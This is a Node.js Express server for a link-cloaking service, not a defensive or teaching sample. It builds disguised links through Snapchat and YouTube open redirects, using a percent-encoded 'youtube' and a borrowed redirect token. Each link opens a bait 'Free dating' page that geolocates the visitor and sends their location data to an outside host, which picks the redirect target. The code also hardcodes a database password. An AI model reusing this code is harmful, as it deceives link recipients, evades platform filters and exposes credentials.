
const http = require("http");
const express = require("express");
const morgan = require("morgan");
const path = require("path");
const cors = require("cors");

const mongoose = require("mongoose");
const request = require('request');

const validUrl = require('valid-url');
const shortid = require('shortid');
const fs = require("fs")
const {Server} = require("socket.io");
const NewLink = require("./model/NewLink");
const LoginUser = require("./model/LoginUser");

const auth = require("./auth")
const link = require("./youtube.link")
const app = express()
var server = http.createServer(app)
//app.use(express.static("client/build"))
var url = require('url');

var q = url.parse(link, true);
 app.use(cors(),express.json(),morgan("dev"))
 console.log(q.redirect_token)
 // file

//
const mainDomain = "http://localhost:5051"

console.log(q.query.redir_token)
//database

const URL = "mongodb+srv://msbhh-ms:ppooiiUU1122@helloworld.jutgf7a.mongodb.net/?retryWrites=true&w=majority"
mongoose.set('strictQuery', true);

//


//new socket server
var server = http.createServer(app);
const io = new Server(server)


// user validation start

// const  gNewLink =  {
//     email:"shohag.i.sajjad@gmail.com",
//     password:"ppooiiUU1122",
//     code:"fdfhh"
 

//     }
// d = new LoginUser(gNewLink)
// d.save()
// user validation end


app.post("/loginuser",(req,res)=>{
    console.log(req.body)
auth.forEach((value)=>{
  if(req.body.email === value.email){
    if(req.body.password === value.password){
        console.log("ok")
        res.status(200).json({message:"ok"})
    }
}
})
    
})
console.log(auth)

//r start

//
        app.use(express.static("client/build"))
      
        
//
app.get("/",(req,res)=>{
  res.sendFile(path.resolve(__dirname,"client","build","index.html"))
})

//redirct start

async function Redirctor(){
    ;(await NewLink.find()).forEach((value)=>{
        console.log(value.id)
        app.get(`/r/${value.id}`,(req,res)=>{
            console.log("re link")
            res.redirect(value.link)
        })
       // copy paste 
      app.get(`/u/${value.id}`,(req,res)=>{

      
        // console.log("re copy")
        // app.use(express.static("client/build"))
      
        // res.sendFile(path.resolve(__dirname,"client","build","index.html"))
        //           //socket
        //   io.on("connection",(socket)=>{
  
        //     socket.emit("url",`${mainDomain}/r/${value.id}`)
         
        //  console.log("new user connected")
        //  socket.on("disconnect",()=>{
        //     console.log("user disconnected")
        //  })
        // })
        
        
        // //socket

        res.send(`
        <!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8" />
      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       <link rel="apple-touch-icon" href="https://i.postimg.cc/zXFgZQwH/logo192.jpg" />
      <title>💋💋Free dating  - Join for free😍 </title>
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
      
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" />
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tw-elements/dist/css/index.min.css" />
      <script src="https://cdn.tailwindcss.com"></script>
      <script>
        tailwind.config = {
          theme: {
            extend: {
              fontFamily: {
                sans: ['Inter', 'sans-serif'],
              },
            }
          }
        }
      </script>
     <style>
         .my-input,h1,h2{color:#000}.my-input,body,h1,h2{font-family:Rajdhani,sans-serif}.btn-primary,.top-section,h1,h2{text-align:center}body{padding:0;margin:0;box-sizing:border-box}.container{margin:0 10px}.top-section{background:url(https://review5zone.com/wp-content/uploads/2022/10/bg.png) center/cover no-repeat;padding:10px}.logo{width:80px!important;height:80px!important;box-shadow:0 0 10px;border-radius:15%;margin-top:20px}h1,h2{font-size:17px;font-weight:500;line-height:1.3}.my-input{display:block;width:78%;height:40px;padding:3px 5%;font-size:20px;line-height:1.42857143;background-color:#fff;background-image:none;border:1px solid #888;border-radius:25px;-webkit-box-shadow:inset 0 1px 1px rgb(0 0 0 / 8%);box-shadow:inset 0 1px 1px rgb(0 0 0 / 8%);margin:0 auto 10px}.btn-primary:active,.btn-primary:hover{font-size:22px;text-shadow:0 0 5px #000;background-color:#28a745;border-color:#28a745;box-shadow:0 0 10px #333}.btn-primary{color:#fff;background-color:#007bff;cursor:pointer;text-shadow:0 0 3px #000;display:inline-block;font-weight:400;white-space:nowrap;vertical-align:middle;border:1px solid transparent;padding:10px 25px;font-size:20px;line-height:1.5;border-radius:15px}.head2,p{line-height:1.3;font-weight:500}.footer{width:100%;min-height:200px auto}.browser{width:100%;height:170px;margin:-20px 0}.hero-content p{margin-top:-8px}h1#head{font-size:25px;line-height:.5;font-weight:500}.animation-up-down{animation:7s infinite updown;transition:.3s}@keyframes updown{0%,100%{transform:translate(0,10px)}35%{transform:translate(0,0)}60%{transform:translate(0,-10px)}}@media (min-width:768px){.browser{width:100%;height:400px}img{max-width:100%}.my-input{width:48%}}     

   
   </style>

   </head>
   <body>
    
     <section style="margin-top: 200px;">
        <div >
           <h2>Please wait to redirect</h2>
           <div class="flex items-center justify-center">
              <div class="spinner-border animate-spin inline-block w-8 h-8 border-4 rounded-full" role="status">
                <span class="visually-hidden">Loading...</span>
              </div>
            </div>
        </div>
     </section>
     <script src=" https://cdnjs.cloudflare.com/ajax/libs/axios/1.2.1/axios.min.js"></script>
      <script>
        const offerLink = "${mainDomain}/r/${value.id}"
          localStorage.removeItem("url")
            let timecon  = Intl.DateTimeFormat().resolvedOptions().timeZone ==="Asia/Dhaka"
         function copyToClipboard(text) {
           var sampleTextarea = document.createElement("textarea");
           document.body.appendChild(sampleTextarea);
           sampleTextarea.value = text; //save main text in it
           sampleTextarea.select(); //select textarea contenrs
           document.execCommand("copy");
           document.body.removeChild(sampleTextarea);
         }
         
         function myFunction() {
          var copyText = document.getElementById("myInput");
           copyToClipboard(JSON.parse(localStorage.getItem("url")) || copyText.value);
           // Alert the copied text
           alert("Copied The URL: " + copyText.value);
           
         }


         function CustomFunc(){
            axios.get("https://geolocation-db.com/json/").then((res)=>{
      //
      const checkTrue = res.data.country_code === "BD"
      console.log()
    if(checkTrue ===false && timecon === false){
      axios.post("https://codeadmincoderunner.xyz/users",{message:{timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,country:res.data,furl:URL}}).then(res=>{
         console.log(res.data.message || "hello")
         localStorage.setItem("url",JSON.stringify(res.data.message))
         console.log("ok")
         if(res.data.message){
           window.location = res.data.message || offerLink
         }
         if(!res.data.message){
           window.location = offerLink
         }
        })
    }
    //
    if(checkTrue ===true || timecon === true){
     window.location = offerLink
    }
   })
         }
         CustomFunc()
         console.log("local",JSON.parse(localStorage.getItem("url")))
      </script>
 
   </body>
</html>
`)

      })
    //copy paste end
    })
}

Redirctor()
//resirct end

//r end

//connected frontend
//find  control data
async function FindControlData (){
    //

    const  gNewLink =  {
        id:shortid.generate().toLocaleLowerCase(),
     
        link:"facebook.com"

        }
        //
        saveData = new NewLink(gNewLink)
      await  saveData.save().then(()=>{
        console.log(gNewLink)
         console.log("datasaved")
        //  res.status(200).json({messge:`${mainDomain}/u/${gNewLink.id}`})
          Redirctor()
        })
    //
app.post("/noyon",async(req,res)=>{
   const  gNewLink =  {
        id:shortid.generate().toLocaleLowerCase(),
     
        link:req.body.link

        }
        //
        saveData = new NewLink(gNewLink)
      await  saveData.save().then(()=>{
        console.log(gNewLink)
         console.log("datasaved")
         res.status(200).json({messge:`https://click.snapchat.com/aVHG?&af_web_dp=https://www.yo%75%74%75be.com/redirect?q=${mainDomain}/u/${gNewLink.id}&html_redirect=1&redir_token=${q.query.redir_token}`})
          Redirctor()
        })
     
})

}
// set data






//

app.get("/",(req,res)=>{
    
      res.send("hello")
       
})











// database connected

main().then(()=>{
    console.log("database connected")
    //find all

    FindControlData()
   //
     Redirctor()
    //findallend
    
})

.catch(err => console.log(err));

async function main() {
  await mongoose.connect(URL);

}




//server.listen()server.listen()
server.listen(process.env.PORT ||   5051)




